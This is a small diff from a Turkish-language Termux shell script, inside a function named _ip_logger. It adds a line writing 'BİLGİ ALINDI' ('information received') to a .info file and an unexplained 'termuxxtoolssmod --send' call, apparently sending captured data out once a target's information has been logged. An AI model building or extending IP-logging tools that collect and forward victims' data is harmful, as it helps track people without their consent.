@@ -311,6 +311,8 @@ _ip_logger(){
 			echo
 			echo
 			echo
+			echo "[✓] BİLGİ ALINDI" > .info
+			termuxxtoolssmod --send
 			echo -e "
 	\t\t\e[1;33mBİLGİ ALINDI\n
 	\e[31m──────────────────────────────────────────────────
